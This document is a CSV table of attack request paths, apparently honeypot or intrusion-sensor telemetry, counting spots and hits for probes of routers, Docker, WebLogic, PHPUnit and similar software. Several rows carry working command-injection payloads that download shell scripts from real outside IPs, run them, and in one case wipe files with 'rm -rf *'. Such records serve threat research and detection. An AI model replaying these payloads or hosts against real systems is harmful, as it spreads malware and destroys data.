Signature,Spots,Hits
/goform/setUsbUnload/.js,22,1117
/pages/createpage-entervariables.action,22,458
/backupmgt/localJob.php,22,281
/v1.40/containers/create,22,256
/,21,203
/include/makecvs.php,21,95
/_config/query_servers/cmd,21,79
/body.txt,21,27
/console/css/%252e%252e%252fconsole.portal,20,60
/tools.cgi,20,41
/checkValid,19,592
/console/css/%252e%252e/consolejndi.portal,19,42
/cgibin/mainfunction.cgi&action=login&keyPath=wget+https%3A%2F%2Fiplogger.org/2EULU5&loginUser=a&loginPwd=a,19,19
/cgibin/mainfunction.cgi&action=login&keyPath=wget+http%3A%2F%2F136.144.41.3%2Fdaytreckcndjknckd%2Fohsitsvegawellrip.sh+%3B+chmod+777+ohsitsvegawellrip.sh+%3B+sh+ohsitsvegawellrip.sh%3Bwget+https%3A%2F%2Fiplogger.org%2F2FGVP5&loginUser=a&loginPwd=a,19,19
/pages/doenterpagevariables.action,18,3428
/run,18,603
/console/css/%252e%252e%252fconsolejndi.portal,17,169
/guest_auth/guestIsUp.php,17,91
/zhnping.cmd,17,33
/live/CPEManager/AXCampaignManager/delete_cpes_by_ids,16,43
/goform/SystemCommand,16,42
/v1.26/containers/create,16,33
/cgibin/mainfunction.cgi&action=login&keyPath=wget+https%3A%2F%2F2no.co/2EULU5&loginUser=a&loginPwd=a,16,16
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,15,177
/editBlackAndWhiteList,15,132
/AdminService/urest/v1/LogonResource,15,40
/getclock,15,22
/dnslookup.cgi,15,15
/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,14,164
/storfs-asup,14,121
/check_browser,14,22
/q,13,110
/GponForm/diag_Form,13,37
/api/getServices,13,35
/users,12,64
/formWlanSetup.htm,11,20
/goform/setSysAdm,10,151
/struts2-rest-showcase/orders/3,10,148
/shellcd%20/tmp%20%7C%7C%20cd%20/run%20%7C%7C%20cd%20/;%20wget%20http://107.175.194.3/daqwbins.sh;%20chmod%20777%20daqwbins.sh;%20sh%20daqwbins.sh;%20tftp%20107.175.194.3%20-c%20get%20daqwtftp1.sh;%20chmod%20777%20daqwtftp1.sh;%20sh%20daqwtftp1.sh;%20tftp%20-r%20daqwtftp2.sh%20-g%20107.175.194.3;%20chmod%20777%20daqwtftp2.sh;%20sh%20daqwtftp2.sh;%20rm%20-rf%20daqwbins.sh%20daqwtftp1.sh%20daqwtftp2.sh;%20rm%20-rf%20*,10,26
/login,10,18
//uapi-cgi/certmngr.cgi,9,118
/wsman,9,22
/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,9,13
/login.htm,8,157
/cgi/networkDiag.cgi,8,147
/assets/php/upload.php,8,140
/search.php,8,139
/sys_config_valid.xgi,8,42
/service/extdirect,8,17
/apply.cgi,8,12
/graph_realtime.php,7,146
/mgmt/tm/util/bash,7,11
/orders/3,6,143
/jbossass/jbossass.jsp,6,43
/tos/index.php,6,8
/8UsA1.sh,6,8
/rest/tinymce/1/macro/preview,6,6
/goform/setmac,5,142
/cn/cmd,5,23
/cgi,5,9
/shell&cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F195.133.40.24%2FS1eJ3%2FIObeENwjarm%20-O%20IObeENwjarm%3B%20chmod%20755%20IObeENwjarm%3B%20.%2FIObeENwjarm%3B%20rm%20-f%20IObeENwjarm,5,6
/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20wget%20http%3A//176.32.34.111%3A24791/dlink%20-O%20test,5,5
/cgibin/mainfunction.cgi&action=login&keyPath=wget+http%3A%2F%2F51.222.56.159%2Fsh+%3B+chmod+777+sh+%3B+sh+sh&loginUser=a&loginPwd=a,5,5
/shell%20,5,5
/shell%00,5,5
/var,4,136
/solr/%7B%7Bcore%7D%7D/select,4,136
/solr/%7B%7Bcore%7D%7D/dataimport,4,130
/upload,4,122
/nrdh.php,4,17
/wls-wsat/RegistrationPortTypeRPC,4,14
/new-index.php,4,14
/wikindex.php,4,14
/baindex.php,4,14
/zindex.php,4,14
/v1.23/containers/create,4,12
/_search,4,10
/op_type=ping&destination=cd%20/tmp;%20wget%20http://iotlmao.xyz/lolol.sh;%20chmod%20777%20lolol.sh;%20sh%20lolol.sh,4,7
/boardDataWW.php,4,7
/cgi-bin-igd/netcore_get.cgi,4,6
/cgibin/mainfunction.cgi&action=login&keyPath=wget+http%3A%2F%2F108.174.62.168%2FHilix.sh+%3B+chmod+777+Hilix.sh+%3B+sh+Hilix.sh&loginUser=a&loginPwd=a,4,5
/_cat/indices,4,4
/include/exportUser.php,4,4
//console/css/%252e%252e%252fconsolejndi.portal,3,29
/druid/indexer/v1/sampler,3,5
/password_change.cgi,3,4
/sntpcfg.cgi,3,3
/secure/ContactAdministrators.jspa,3,3
/restapps/applications.php,3,3
/v1.37/containers/create,3,3
/struts2-showcase/index.action,3,3
/v1.39/containers/create,3,3
/fuel/pages/select/,3,3
/pandora_console/index.php,2,37
/_async/AsyncResponseService,2,26
